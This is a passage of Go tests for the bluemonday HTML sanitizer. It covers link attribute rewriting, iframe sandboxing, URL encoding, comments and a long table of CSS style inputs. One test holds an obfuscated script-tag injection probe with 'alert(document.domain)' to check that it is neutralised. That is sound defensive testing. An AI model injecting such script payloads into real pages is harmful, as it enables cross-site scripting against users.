		{
			in:       `<a href="https://www.google.com/" />`,
			expected: `<a href="https://www.google.com/" rel="nofollow noopener" target="_blank"/>`,
		},
		{
			in:       `<a href="https://www.google.com/" target="_blank"/>`,
			expected: `<a href="https://www.google.com/" target="_blank" rel="nofollow noopener"/>`,
		},
		{
			in:       `<a href="https://www.google.com/" rel="nofollow"/>`,
			expected: `<a href="https://www.google.com/" rel="nofollow noopener" target="_blank"/>`,
		},
		{
			in:       `<a href="https://www.google.com/" rel="noopener"/>`,
			expected: `<a href="https://www.google.com/" rel="nofollow noopener" target="_blank"/>`,
		},
		{
			in:       `<a href="https://www.google.com/" rel="noopener nofollow" />`,
			expected: `<a href="https://www.google.com/" rel="nofollow noopener" target="_blank"/>`,
		},
		{
			in:       `<a href="https://www.google.com/" target="foo" />`,
			expected: `<a href="https://www.google.com/" target="_blank" rel="nofollow noopener"/>`,
		},
	}

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestIFrameSandbox(t *testing.T) {
	p := NewPolicy()
	p.AllowAttrs("sandbox").OnElements("iframe")
	p.RequireSandboxOnIFrame(SandboxAllowForms, SandboxAllowPopups)

	in := `<iframe src="http://example.com" sandbox="allow-forms allow-downloads allow-downloads allow-popups"></iframe>`
	expected := `<iframe sandbox="allow-forms allow-popups"></iframe>`
	out := p.Sanitize(in)
	if out != expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			in,
			out,
			expected,
		)
	}
}

func TestSanitizedURL(t *testing.T) {
	tests := []test{
		{
			in:       `http://abc.com?d=1&a=2&a=3`,
			expected: `http://abc.com?d=1&a=2&a=3`,
		},
		{
			in:       `http://abc.com?d=1 2&a=2&a=3`,
			expected: `http://abc.com?d=1+2&a=2&a=3`,
		},
		{
			in:       `http://abc.com?d=1/2&a=2&a=3`,
			expected: `http://abc.com?d=1%2F2&a=2&a=3`,
		},
		{
			in:       `http://abc.com?<d>=1&a=2&a=3`,
			expected: `http://abc.com?%26lt%3Bd%26gt%3B=1&a=2&a=3`,
		},
	}

	for _, theTest := range tests {
		res, err := sanitizedURL(theTest.in)
		if err != nil {
			t.Errorf("sanitizedURL returned error: %v", err)
		}
		if theTest.expected != res {
			t.Errorf(
				"test failed;\ninput   : %s\nexpected: %s, actual: %s",
				theTest.in,
				theTest.expected,
				res,
			)
		}
	}
}

func TestIssue111ScriptTags(t *testing.T) {
	p1 := NewPolicy()
	p2 := UGCPolicy()
	p3 := UGCPolicy().AllowElements("script")

	in := `<scr\u0130pt>&lt;script&gt;alert(document.domain)&lt;/script&gt;`
	expected := `&lt;script&gt;alert(document.domain)&lt;/script&gt;`
	out := p1.Sanitize(in)
	if out != expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			in,
			out,
			expected,
		)
	}

	expected = `&lt;script&gt;alert(document.domain)&lt;/script&gt;`
	out = p2.Sanitize(in)
	if out != expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			in,
			out,
			expected,
		)
	}

	expected = `&lt;script&gt;alert(document.domain)&lt;/script&gt;`
	out = p3.Sanitize(in)
	if out != expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			in,
			out,
			expected,
		)
	}
}

func TestQuotes(t *testing.T) {
	p := UGCPolicy()

	tests := []test{
		{
			in:       `noquotes`,
			expected: `noquotes`,
		},
		{
			in:       `"singlequotes"`,
			expected: `&#34;singlequotes&#34;`,
		},
		{
			in:       `""doublequotes""`,
			expected: `&#34;&#34;doublequotes&#34;&#34;`,
		},
	}

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestComments(t *testing.T) {
	p := UGCPolicy()

	tests := []test{
		{
			in:       `1 <!-- 2 --> 3`,
			expected: `1  3`,
		},
		{
			in:       `<!--[if gte mso 9]>Hello<![endif]-->`,
			expected: ``,
		},
	}

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()

	p.AllowComments()

	tests = []test{
		{
			in:       `1 <!-- 2 --> 3`,
			expected: `1 <!-- 2 --> 3`,
		},
		// Note that prior to go1.19 this test worked and preserved HTML comments
		// of the style used by Microsoft to create browser specific sections.
		//
		// However as @zhsj notes https://github.com/microcosm-cc/bluemonday/pull/148
		// the commit https://github.com/golang/net/commit/06994584 broke this.
		//
		// I haven't found a way to allow MS style comments without creating a risk
		// for every user of bluemonday that utilises .AllowComments()
		{
			in:       `<!--[if gte mso 9]>Hello<![endif]-->`,
			expected: `<!--[if gte mso 9]>Hello<![endif]-->`,
		},
	}

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg = sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestDefaultStyleHandlers(t *testing.T) {

	tests := []test{
		{
			in:       `<div style="nonexistentStyle: something;"></div>`,
			expected: `<div></div>`,
		},
		{
			in:       `<div style="aLiGn-cOntEnt: cEntEr;"></div>`,
			expected: `<div style="aLiGn-cOntEnt: cEntEr"></div>`,
		},
		{
			in:       `<div style="align-items: center;"></div>`,
			expected: `<div style="align-items: center"></div>`,
		},
		{
			in:       `<div style="align-self: center;"></div>`,
			expected: `<div style="align-self: center"></div>`,
		},
		{
			in:       `<div style="all: initial;"></div>`,
			expected: `<div style="all: initial"></div>`,
		},
		{
			in: `<div style="animation: mymove 5s infinite;"></div><div` +
				` style="animation: inherit;"></div>`,
			expected: `<div style="animation: mymove 5s infinite"></div><div` +
				` style="animation: inherit"></div>`,
		},
		{
			in: `<div style="animation-delay: 2s;"></div><div style=` +
				`"animation-delay: initial;"></div>`,
			expected: `<div style="animation-delay: 2s"></div><div style=` +
				`"animation-delay: initial"></div>`,
		},
		{
			in:       `<div style="animation-direction: alternate;"></div>`,
			expected: `<div style="animation-direction: alternate"></div>`,
		},
		{
			in: `<div style="animation-duration: 2s;"></div><div style=` +
				`"animation-duration: initial;"></div>`,
			expected: `<div style="animation-duration: 2s"></div><div style=` +
				`"animation-duration: initial"></div>`,
		},
		{
			in:       `<div style="animation-fill-mode: forwards;"></div>`,
			expected: `<div style="animation-fill-mode: forwards"></div>`,
		},
		{
			in: `<div style="animation-iteration-count: 4;"></div><div ` +
				`style="animation-iteration-count: inherit;"></div>`,
			expected: `<div style="animation-iteration-count: 4"></div><div ` +
				`style="animation-iteration-count: inherit"></div>`,
		},
		{
			in: `<div style="animation-name: chuck;"></div><div style=` +
				`"animation-name: none"></div>`,
			expected: `<div style="animation-name: chuck"></div><div style=` +
				`"animation-name: none"></div>`,
		},
		{
			in:       `<div style="animation-play-state: running;"></div>`,
			expected: `<div style="animation-play-state: running"></div>`,
		},
		{
			in: `<div style="animation-timing-function: ` +
				`cubic-bezier(1,1,1,1);"></div><div style=` +
				`"animation-timing-function: steps(2, start);"></div>`,
			expected: `<div style="animation-timing-function: ` +
				`cubic-bezier(1,1,1,1)"></div><div style=` +
				`"animation-timing-function: steps(2, start)"></div>`,
		},
		{
			in:       `<div style="backface-visibility: hidden"></div>`,
			expected: `<div style="backface-visibility: hidden"></div>`,
		},
		{
			in: `<div style="background: lightblue ` +
				`url('https://img_tree.gif') no-repeat fixed center"></div>` +
				`<div style="background: initial"></div>`,
			expected: `<div style="background: lightblue ` +
				`url(&#39;https://img_tree.gif&#39;) no-repeat fixed center">` +
				`</div><div style="background: initial"></div>`,
		},
		{
			in:       `<div style="background-attachment: fixed"></div>`,
			expected: `<div style="background-attachment: fixed"></div>`,
		},
		{
			in:       `<div style="background-blend-mode: lighten"></div>`,
			expected: `<div style="background-blend-mode: lighten"></div>`,
		},
		{
			in:       `<div style="background-clip: padding-box"></div>`,
			expected: `<div style="background-clip: padding-box"></div>`,
		},
		{
			in:       `<div style="background-color: coral"></div>`,
			expected: `<div style="background-color: coral"></div>`,
		},
		{
			in: `<div style="background-image: url('http://paper.gif')">` +
				`</div><div style="background-image: inherit"></div>`,
			expected: `<div style="background-image: ` +
				`url(&#39;http://paper.gif&#39;)"></div><div style="` +
				`background-image: inherit"></div>`,
		},
		{
			in:       `<div style="background-origin: content-box"></div>`,
			expected: `<div style="background-origin: content-box"></div>`,
		},
		{
			in: `<div style="background-position: center"></div><div ` +
				`style="background-position: 20px 20px"></div>`,
			expected: `<div style="background-position: center"></div><div ` +
				`style="background-position: 20px 20px"></div>`,
		},
		{
			in:       `<div style="background-repeat: repeat-y"></div>`,
			expected: `<div style="background-repeat: repeat-y"></div>`,
		},
		{
			in: `<div style="background-size: 300px 100px"></div><div ` +
				`style="background-size: initial"></div>`,
			expected: `<div style="background-size: 300px 100px"></div>` +
				`<div style="background-size: initial"></div>`,
		},
		{
			in: `<div style="border: 4px dotted blue;"></div><div ` +
				`style="border: initial;"></div>`,
			expected: `<div style="border: 4px dotted blue"></div><div ` +
				`style="border: initial"></div>`,
		},
		{
			in: `<div style="border-bottom: 4px dotted blue;"></div>` +
				`<div style="border-bottom: initial"></div>`,
			expected: `<div style="border-bottom: 4px dotted blue"></div>` +
				`<div style="border-bottom: initial"></div>`,
		},
		{
			in:       `<div style="border-bottom-color: blue;"></div>`,
			expected: `<div style="border-bottom-color: blue"></div>`,
		},
		{
			in: `<div style="border-bottom-left-radius: 4px;"></div>` +
				`<div style="border-bottom-left-radius: initial"></div>`,
			expected: `<div style="border-bottom-left-radius: 4px"></div>` +
				`<div style="border-bottom-left-radius: initial"></div>`,
		},
		{
			in: `<div style="border-bottom-right-radius: 40px 4px;">` +
				`</div>`,
			expected: `<div style="border-bottom-right-radius: 40px 4px">` +
				`</div>`,
		},
		{
			in:       `<div style="border-bottom-style: dotted;"></div>`,
			expected: `<div style="border-bottom-style: dotted"></div>`,
		},
		{
			in:       `<div style="border-bottom-width: thin;"></div>`,
			expected: `<div style="border-bottom-width: thin"></div>`,
		},
		{
			in:       `<div style="border-collapse: separate;"></div>`,
			expected: `<div style="border-collapse: separate"></div>`,
		},
		{
			in:       `<div style="border-color: coral;"></div>`,
			expected: `<div style="border-color: coral"></div>`,
		},
		{
			in: `<div style="border-image: url(https://border.png) 30 ` +
				`round;"></div><div style="border-image: initial;"></div>`,
			expected: `<div style="border-image: url(https://border.png) 30 ` +
				`round"></div><div style="border-image: initial"></div>`,
		},
		{
			in:       `<div style="border-image-outset: 10px;"></div>`,
			expected: `<div style="border-image-outset: 10px"></div>`,
		},
		{
			in:       `<div style="border-image-repeat: repeat;"></div>`,
			expected: `<div style="border-image-repeat: repeat"></div>`,
		},
		{
			in: `<div style="border-image-slice: 30%;"></div><div ` +
				`style="border-image-slice: fill;"></div><div style="` +
				`border-image-slice: 3% 3% 3% 3% 3%;"></div>`,
			expected: `<div style="border-image-slice: 30%"></div><div style` +
				`="border-image-slice: fill"></div><div></div>`,
		},
		{
			in: `<div style="border-image-source: ` +
				`url(https://border.png);"></div>`,
			expected: `<div style="border-image-source: ` +
				`url(https://border.png)"></div>`,
		},
		{
			in:       `<div style="border-image-width: 10px;"></div>`,
			expected: `<div style="border-image-width: 10px"></div>`,
		},
		{
			in:       `<div style="border-left: 4px dotted blue;"></div>`,
			expected: `<div style="border-left: 4px dotted blue"></div>`,
		},
		{
			in:       `<div style="border-left-color: blue;"></div>`,
			expected: `<div style="border-left-color: blue"></div>`,
		},
		{
			in:       `<div style="border-left-style: dotted;"></div>`,
			expected: `<div style="border-left-style: dotted"></div>`,
		},
		{
			in:       `<div style="border-left-width: thin;"></div>`,
			expected: `<div style="border-left-width: thin"></div>`,
		},
		{
			in: `<div style="border-radius: 25px;"></div><div style=` +
				`"border-radius: initial;"></div><div style="border-radius:` +
				` 1px 1px 1px 1px 1px;"></div>`,
			expected: `<div style="border-radius: 25px"></div><div style=` +
				`"border-radius: initial"></div><div></div>`,
		},
		{
			in:       `<div style="border-left: 4px dotted blue;"></div>`,
			expected: `<div style="border-left: 4px dotted blue"></div>`,
		},
		{
			in:       `<div style="border-right-color: blue;"></div>`,
			expected: `<div style="border-right-color: blue"></div>`,
		},
		{
			in:       `<div style="border-right-style: dotted;"></div>`,
			expected: `<div style="border-right-style: dotted"></div>`,
		},
		{
			in:       `<div style="border-right-width: thin;"></div>`,
			expected: `<div style="border-right-width: thin"></div>`,
		},
		{
			in:       `<div style="border-spacing: 15px;"></div>`,
			expected: `<div style="border-spacing: 15px"></div>`,
		},
		{
			in: `<div style="border-style: dotted;"></div><div style="` +
				`border-style: initial;"></div><div style="border-style: ` +
				`dotted dotted dotted dotted dotted;"></div>`,
			expected: `<div style="border-style: dotted"></div><div style=` +
				`"border-style: initial"></div><div></div>`,
		},
		{
			in:       `<div style="border-top: 4px dotted blue;"></div>`,
			expected: `<div style="border-top: 4px dotted blue"></div>`,
		},
		{
			in:       `<div style="border-top-color: blue;"></div>`,
			expected: `<div style="border-top-color: blue"></div>`,
		},
		{
			in:       `<div style="border-top-left-radius: 4px;"></div>`,
			expected: `<div style="border-top-left-radius: 4px"></div>`,
		},
		{
			in:       `<div style="border-top-right-radius: 40px 4px;"></div>`,
			expected: `<div style="border-top-right-radius: 40px 4px"></div>`,
		},
		{
			in:       `<div style="border-top-style: dotted;"></div>`,
			expected: `<div style="border-top-style: dotted"></div>`,
		},
		{
			in:       `<div style="border-top-width: thin;"></div>`,
			expected: `<div style="border-top-width: thin"></div>`,
		},
		{
			in: `<div style="border-width: thin;"></div><div style="` +
				`border-width: initial;"></div><div style="border-width: ` +
				`thin thin thin thin thin;"></div>`,
			expected: `<div style="border-width: thin"></div><div style="` +
				`border-width: initial"></div><div></div>`,
		},
		{
			in: `<div style="bottom: 10px;"></div><div style="bottom:` +
				` auto;"></div>`,
			expected: `<div style="bottom: 10px"></div><div style="bottom:` +
				` auto"></div>`,
		},
		{
			in:       `<div style="box-decoration-break: slice;"></div>`,
			expected: `<div style="box-decoration-break: slice"></div>`,
		},
		{
			in: `<div style="box-shadow: 10px 10px #888888;"></div>` +
				`<div style="box-shadow: aa;"></div><div style="box-shadow: ` +
				`10px aa;"></div><div style="box-shadow: 10px;"></div><div ` +
				`style="box-shadow: 10px 10px aa;"></div>`,
			expected: `<div style="box-shadow: 10px 10px #888888"></div>` +
				`<div></div><div></div><div></div><div></div>`,
		},
		{
			in:       `<div style="box-sizing: border-box;"></div>`,
			expected: `<div style="box-sizing: border-box"></div>`,
		},
		{
			in:       `<div style="break-after: column;"></div>`,
			expected: `<div style="break-after: column"></div>`,
		},
		{
			in:       `<div style="break-before: column;"></div>`,
			expected: `<div style="break-before: column"></div>`,
		},
		{
			in:       `<div style="break-inside: avoid-column;"></div>`,
			expected: `<div style="break-inside: avoid-column"></div>`,
		},
		{
			in:       `<div style="caption-side: bottom;"></div>`,
			expected: `<div style="caption-side: bottom"></div>`,
		},
		{
			in: `<div style="caret-color: red;"></div><div style=` +
				`"caret-color: rgb(2,2,2);"></div><div style="caret-color:` +
				` rgba(2,2,2,0.5);"></div><div style="caret-color: ` +
				`hsl(2,2%,2%);"></div><div style="caret-color: ` +
				`hsla(2,2%,2%,0.5);"></div>`,
			expected: `<div style="caret-color: red"></div><div style=` +
				`"caret-color: rgb(2,2,2)"></div><div style="caret-color: ` +
				`rgba(2,2,2,0.5)"></div><div style="caret-color: ` +
				`hsl(2,2%,2%)"></div><div style="caret-color: ` +
				`hsla(2,2%,2%,0.5)"></div>`,
		},
		{
			in:       `<div style="clear: both;"></div>`,
			expected: `<div style="clear: both"></div>`,
		},
		{
			in: `<div style="clip: rect(0px,60px,200px,0px);"></div>` +
				`<div style="clip: auto;"></div>`,
			expected: `<div style="clip: rect(0px,60px,200px,0px)"></div>` +
				`<div style="clip: auto"></div>`,
		},
		{
			in: `<div style="color: red;"></div><div style="color: ` +
				`rgb(2,2,2);"></div><div style="color: rgba(2,2,2,0.5);">` +
				`</div><div style="color: hsl(2,2%,2%);"></div><div style="` +
				`color: hsla(2,2%,2%,0.5);"></div>`,
			expected: `<div style="color: red"></div><div style="color: ` +
				`rgb(2,2,2)"></div><div style="color: rgba(2,2,2,0.5)">` +
				`</div><div style="color: hsl(2,2%,2%)"></div><div style="` +
				`color: hsla(2,2%,2%,0.5)"></div>`,
		},
		{
			in:       `<div style="clear: both;"></div>`,
			expected: `<div style="clear: both"></div>`,
		},
		{
			in: `<div style="column-count: 3;"></div><div style="` +
				`column-count: auto;"></div>`,
			expected: `<div style="column-count: 3"></div><div style="` +
				`column-count: auto"></div>`,
		},
		{
			in:       `<div style="column-fill: balance;"></div>`,
			expected: `<div style="column-fill: balance"></div>`,
		},
		{
			in: `<div style="column-gap: 40px;"></div><div style="` +
				`column-gap: normal;"></div>`,
			expected: `<div style="column-gap: 40px"></div><div style="` +
				`column-gap: normal"></div>`,
		},
		{
			in:       `<div style="column-rule: 4px double #ff00ff;"></div>`,
			expected: `<div style="column-rule: 4px double #ff00ff"></div>`,
		},
		{
			in:       `<div style="column-rule-color: #ff00ff;"></div>`,
			expected: `<div style="column-rule-color: #ff00ff"></div>`,
		},
		{
			in:       `<div style="column-rule-color: #f0ff;"></div>`,
			expected: `<div style="column-rule-color: #f0ff"></div>`,
		},
		{
			in:       `<div style="column-rule: red;"></div>`,
			expected: `<div style="column-rule: red"></div>`,
		},
		{
			in:       `<div style="column-rule-width: 4px;"></div>`,
			expected: `<div style="column-rule-width: 4px"></div>`,
		},
		{
			in:       `<div style="column-span: all;"></div>`,
			expected: `<div style="column-span: all"></div>`,
		},
		{
			in: `<div style="column-width: 4px;"></div><div style="` +
				`column-width: auto;"></div>`,
			expected: `<div style="column-width: 4px"></div><div style="` +
				`column-width: auto"></div>`,
		},
		{
			in: `<div style="columns: 4px 3"></div><div style="` +
				`columns: auto"></div>`,
			expected: `<div style="columns: 4px 3"></div><div style="` +
				`columns: auto"></div>`,
		},
		{
			in:       `<div style="cursor: alias"></div>`,
			expected: `<div style="cursor: alias"></div>`,
		},
		{
			in:       `<div style="direction: rtl"></div>`,
			expected: `<div style="direction: rtl"></div>`,
		},
		{
			in:       `<div style="display: block"></div>`,
			expected: `<div style="display: block"></div>`,
		},
		{
			in:       `<div style="empty-cells: hide"></div>`,
			expected: `<div style="empty-cells: hide"></div>`,
		},
		{
			in: `<div style="filter: grayscale(100%)"></div><div style` +
				`="filter: sepia(100%)"></div>`,
			expected: `<div style="filter: grayscale(100%)"></div><div style` +
				`="filter: sepia(100%)"></div>`,
		},
		{
			in: `<div style="flex: 1"></div><div style="flex: auto">` +
				`</div>`,
			expected: `<div style="flex: 1"></div><div style="flex: auto">` +
				`</div>`,
		},
		{
			in: `<div style="flex-basis: 10px"></div><div style="` +
				`flex-basis: auto"></div>`,
			expected: `<div style="flex-basis: 10px"></div><div style="` +
				`flex-basis: auto"></div>`,
		},
		{
			in:       `<div style="flex-direction: row-reverse"></div>`,
			expected: `<div style="flex-direction: row-reverse"></div>`,
		},
		{
			in: `<div style="flex-flow: row-reverse wrap"></div><div ` +
				`style="flex-flow: initial"></div>`,
			expected: `<div style="flex-flow: row-reverse wrap"></div><div ` +
				`style="flex-flow: initial"></div>`,
		},
		{
			in: `<div style="flex-grow: 1"></div><div style="flex-grow` +
				`: initial"></div>`,
			expected: `<div style="flex-grow: 1"></div><div style="flex-grow` +
				`: initial"></div>`,
		},
		{
			in:       `<div style="flex-shrink: 3"></div>`,
			expected: `<div style="flex-shrink: 3"></div>`,
		},
		{
			in:       `<div style="flex-wrap: wrap"></div>`,
			expected: `<div style="flex-wrap: wrap"></div>`,
		},
		{
			in:       `<div style="float: right"></div>`,
			expected: `<div style="float: right"></div>`,
		},
		{
			in: `<div style="font: italic bold 12px/30px Georgia, serif` +
				`"></div><div style="font: icon"></div>`,
			expected: `<div style="font: italic bold 12px/30px Georgia, serif` +
				`"></div><div style="font: icon"></div>`,
		},
		{
			in: `<div style="font-family: 'Times New Roman', Times, ` +
				`serif"></div><span style="font-family: comic sans ms, ` +
				`cursive, sans-serif;">aaaaaa</span></span>`,
			expected: `<div style="font-family: &#39;Times New Roman&#39;,` +
				` Times, serif"></div><span style="font-family: comic sans` +
				` ms, cursive, sans-serif">aaaaaa</span></span>`,
		},
		{
			in:       `<div style="font-kerning: normal"></div>`,
			expected: `<div style="font-kerning: normal"></div>`,
		},
		{
			in:       `<div style="font-language-override: normal"></div>`,
			expected: `<div style="font-language-override: normal"></div>`,
		},
		{
			in:       `<div style="font-size: large"></div>`,
			expected: `<div style="font-size: large"></div>`,
		},
		{
			in: `<div style="font-size-adjust: 0.58"></div><div style="` +
				`font-size-adjust: auto"></div>`,
			expected: `<div style="font-size-adjust: 0.58"></div><div style="` +
				`font-size-adjust: auto"></div>`,
		},
		{
			in:       `<div style="font-stretch: expanded"></div>`,
			expected: `<div style="font-stretch: expanded"></div>`,
		},
		{
			in:       `<div style="font-style: italic"></div>`,
			expected: `<div style="font-style: italic"></div>`,
		},
		{
			in:       `<div style="font-synthesis: style"></div>`,
			expected: `<div style="font-synthesis: style"></div>`,
		},
		{
			in:       `<div style="font-variant: small-caps"></div>`,
			expected: `<div style="font-variant: small-caps"></div>`,
		},
		{
			in:       `<div style="font-variant-caps: small-caps"></div>`,
			expected: `<div style="font-variant-caps: small-caps"></div>`,
		},
		{
			in:       `<div style="font-variant-position: sub"></div>`,
			expected: `<div style="font-variant-position: sub"></div>`,
		},
		{
			in:       `<div style="font-weight: normal"></div>`,
			expected: `<div style="font-weight: normal"></div>`,
		},
		{
			in: `<div style="grid: 150px / auto auto auto;"></div><div ` +
				`style="grid: none;"></div>`,
			expected: `<div style="grid: 150px / auto auto auto"></div><div ` +
				`style="grid: none"></div>`,
		},
		{
			in: `<div style="grid-area: 2 / 1 / span 2 / span 3;">` +
				`</div>`,
			expected: `<div style="grid-area: 2 / 1 / span 2 / span 3">` +
				`</div>`,
		},
		{
			in: `<div style="grid-auto-columns: 150px;"></div>` +
				`<div style="grid-auto-columns: auto;"></div>`,
			expected: `<div style="grid-auto-columns: 150px"></div>` +
				`<div style="grid-auto-columns: auto"></div>`,
		},
		{
			in:       `<div style="grid-auto-flow: column;"></div>`,
			expected: `<div style="grid-auto-flow: column"></div>`,
		},
		{
			in:       `<div style="grid-auto-rows: 150px;"></div>`,
			expected: `<div style="grid-auto-rows: 150px"></div>`,
		},
		{
			in:       `<div style="grid-column: 1 / span 2;"></div>`,
			expected: `<div style="grid-column: 1 / span 2"></div>`,
		},
		{
			in: `<div style="grid-column-end: span 2;"></div>` +
				`<div style="grid-column-end: auto;"></div>`,
			expected: `<div style="grid-column-end: span 2"></div>` +
				`<div style="grid-column-end: auto"></div>`,
		},
		{
			in:       `<div style="grid-column-gap: 10px;"></div>`,
			expected: `<div style="grid-column-gap: 10px"></div>`,
		},
		{
			in:       `<div style="grid-column-start: 1;"></div>`,
			expected: `<div style="grid-column-start: 1"></div>`,
		},
		{
			in: `<div style="grid-gap: 1px;"></div><div style=` +
				`"grid-gap: 1px 1px 1px;"></div>`,
			expected: `<div style="grid-gap: 1px"></div><div></div>`,
		},
		{
			in:       `<div style="grid-row: 1 / span 2;"></div>`,
			expected: `<div style="grid-row: 1 / span 2"></div>`,
		},
		{
			in:       `<div style="grid-row-end: span 2;"></div>`,
			expected: `<div style="grid-row-end: span 2"></div>`,
		},
		{
			in:       `<div style="grid-row-gap: 10px;"></div>`,
			expected: `<div style="grid-row-gap: 10px"></div>`,
		},
		{
			in:       `<div style="grid-row-start: 1;"></div>`,
			expected: `<div style="grid-row-start: 1"></div>`,
		},
		{
			in: `<div style="grid-template: 150px / auto auto auto;">` +
				`</div><div style="grid-template: none"></div><div style="` +
				`grid-template: a / a / a"></div>`,
			expected: `<div style="grid-template: 150px / auto auto auto">` +
				`</div><div style="grid-template: none"></div><div></div>`,
		},
		{
			in: `<div style="grid-template-areas: none;"></div><div ` +
				`style="grid-template-areas: 'Billy'"></div>`,
			expected: `<div style="grid-template-areas: none"></div>` +
				`<div style="grid-template-areas: &#39;Billy&#39;"></div>`,
		},
		{
			in: `<div style="grid-template-columns: auto auto auto` +
				` auto auto;"></div>`,
			expected: `<div style="grid-template-columns: auto auto` +
				` auto auto auto"></div>`,
		},
		{
			in: `<div style="grid-template-rows: 150px 150px">` +
				`</div><div style="grid-template-rows: aaaa aaaaa"></div>`,
			expected: `<div style="grid-template-rows: 150px 150px">` +
				`</div><div></div>`,
		},
		{
			in:       `<div style="hanging-punctuation: first;"></div>`,
			expected: `<div style="hanging-punctuation: first"></div>`,
		},
		{
			in: `<div style="height: 50px;"></div><div style="height: ` +
				`auto;"></div>`,
			expected: `<div style="height: 50px"></div><div style="height: ` +
				`auto"></div>`,
		},
		{
			in:       `<div style="hyphens: manual;"></div>`,
			expected: `<div style="hyphens: manual"></div>`,
		},
		{
			in:       `<div style="isolation: isolate;"></div>`,
			expected: `<div style="isolation: isolate"></div>`,
		},
		{
			in:       `<div style="image-rendering: smooth;"></div>`,
			expected: `<div style="image-rendering: smooth"></div>`,
		},
		{
			in:       `<div style="justify-content: center;"></div>`,
			expected: `<div style="justify-content: center"></div>`,
		},
		{
			in:       `<div style="left: 150px;"></div>`,
			expected: `<div style="left: 150px"></div>`,
		},
		{
			in: `<div style="letter-spacing: -3px;"></div><div style` +
				`="letter-spacing: normal;"></div>`,
			expected: `<div style="letter-spacing: -3px"></div><div style` +
				`="letter-spacing: normal"></div>`,
		},
		{
			in:       `<div style="line-break: auto"></div>`,
			expected: `<div style="line-break: auto"></div>`,
		},
		{
			in: `<div style="line-height: 1.6;"></div><div style=` +
				`"line-height: normal;"></div>`,
			expected: `<div style="line-height: 1.6"></div><div style=` +
				`"line-height: normal"></div>`,
		},
		{
			in: `<div style="list-style: square inside ` +
				`url(http://sqpurple.gif);"></div><div style="list-style: ` +
				`initial"></div>`,
			expected: `<div style="list-style: square inside ` +
				`url(http://sqpurple.gif)"></div><div style="list-style: ` +
				`initial"></div>`,
		},
		{
			in: `<div style="list-style-image: ` +
				`url(http://sqpurple.gif);"></div>`,
			expected: `<div style="list-style-image: ` +
				`url(http://sqpurple.gif)"></div>`,
		},
		{
			in:       `<div style="list-style-position: inside;"></div>`,
			expected: `<div style="list-style-position: inside"></div>`,
		},
		{
			in:       `<div style="list-style-type: square;"></div>`,
			expected: `<div style="list-style-type: square"></div>`,
		},
		{
			in: `<div style="margin: 150px;"></div><div style="margin:` +
				` auto;"></div>`,
			expected: `<div style="margin: 150px"></div><div style="margin:` +
				` auto"></div>`,
		},
		{
			in: `<div style="margin-bottom: 150px;"></div><div ` +
				`style="margin-bottom: auto;"></div>`,
			expected: `<div style="margin-bottom: 150px"></div><div ` +
				`style="margin-bottom: auto"></div>`,
		},
		{
			in:       `<div style="margin-left: 150px;"></div>`,
			expected: `<div style="margin-left: 150px"></div>`,
		},
		{
			in:       `<div style="margin-right: 150px;"></div>`,
			expected: `<div style="margin-right: 150px"></div>`,
		},
		{
			in:       `<div style="margin-top: 150px;"></div>`,
			expected: `<div style="margin-top: 150px"></div>`,
		},
		{
			in: `<div style="max-height: 150px;"></div><div style=` +
				`"max-height: initial;"></div>`,
			expected: `<div style="max-height: 150px"></div><div style=` +
				`"max-height: initial"></div>`,
		},
		{
			in:       `<div style="max-width: 150px;"></div>`,
			expected: `<div style="max-width: 150px"></div>`,
		},
		{
			in: `<div style="min-height: 150px;"></div><div style=` +
				`"min-height: initial;"></div>`,
			expected: `<div style="min-height: 150px"></div><div style=` +
				`"min-height: initial"></div>`,
		},
		{
			in:       `<div style="min-width: 150px;"></div>`,
			expected: `<div style="min-width: 150px"></div>`,
		},
		{
			in:       `<div style="mix-blend-mode: darken;"></div>`,
			expected: `<div style="mix-blend-mode: darken"></div>`,
		},
		{
			in:       `<div style="object-fit: cover;"></div>`,
			expected: `<div style="object-fit: cover"></div>`,
		},
		{
			in: `<div style="object-position: 5px 10%;"></div><div ` +
				`style="object-position: initial"></div><div style="` +
				`object-position: 5px 10% 5px;"></div>`,
			expected: `<div style="object-position: 5px 10%"></div><div ` +
				`style="object-position: initial"></div><div></div>`,
		},
		{
			in: `<div style="opacity: 0.5;"></div><div style="opacity:` +
				` initial"></div>`,
			expected: `<div style="opacity: 0.5"></div><div style="opacity:` +
				` initial"></div>`,
		},
		{
			in: `<div style="order: 2;"></div><div style="order: ` +
				`initial"></div>`,
			expected: `<div style="order: 2"></div><div style="order: ` +
				`initial"></div>`,
		},
		{
			in: `<div style="outline: 2px dashed blue;"></div><div ` +
				`style="outline: initial"></div>`,
